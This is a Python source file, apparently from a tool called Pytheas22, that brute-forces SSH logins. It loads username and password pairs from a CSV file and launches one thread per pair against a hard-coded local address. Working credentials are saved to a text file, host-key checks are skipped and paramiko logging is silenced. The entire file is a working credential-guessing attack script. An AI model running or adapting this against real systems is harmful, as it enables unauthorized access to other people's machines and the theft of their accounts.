import os
import random
import shutil
import socket
import string
import subprocess
import threading
import time
import BetterPrinting as bp
import re
import sqlite3
from requests.structures import CaseInsensitiveDict
import requests
import colorama
from Pytheas22 import port_data
import logging
from logging import NullHandler
from paramiko import SSHClient, AutoAddPolicy, AuthenticationException, ssh_exception
import sys
import csv
import ipaddress


def ssh_connect(host, username, password):
    ssh_client = SSHClient()
    ssh_client.set_missing_host_key_policy(AutoAddPolicy())
    try:
        ssh_client.connect(host, port=22, username=username, password=password, banner_timeout=300)
        with open("credentials_found.txt", "a") as file:
            bp.color(f"Username - {username} and Password - {password} found for {host}!!!!1", "yellow")
            file.write(
                f"Username: {username}\nPassword: {password}\nWorked on host {host}\nTime: {time.strftime('%H:%M: - %d.%m.%y')}\n\n")
            bp.color("CHECK 'credentials_found.txt' TO SEE YOUR PASSWORD", "green")
            time.sleep(1)
    except AuthenticationException:
        bp.color(f"Username - {username} and Password - {password} is Incorrect for {host}", "green")
    except ssh_exception.SSHException:
        bp.color("**** Attempting to connect - Rate limiting on server ****", "green")


logging.getLogger('paramiko.transport').addHandler(NullHandler())
list_file = "passwords.csv"
all_passwords = []
try:
    with open(list_file, "r+") as csv_file:
        csv_reader = csv.reader(csv_file, delimiter=",")
        for lst in list(csv_reader):
            all_passwords.append((lst[0], lst[1]))


except FileNotFoundError:
    bp.color(f"'passwords.csv' could not be found. Download the file on my github: https://github.com/Kill0geR/Pytheas22", "green")
    quit()

ip = "192.168.0.171"

def start_thread():
    start_time = time.perf_counter()
    threads = []
    zahl = 0
    for index, row in enumerate(all_passwords):
        zahl += 1
        t = threading.Thread(target=ssh_connect, args=(ip, row[0], row[1],))
        threads.append(t)

    for thread in threads:
        thread.start()

    for thread in threads:
        thread.join()

    end = time.perf_counter()
    print(f"Time: {end-start_time}")

    print(zahl)
    print(len(all_passwords))


start_thread()
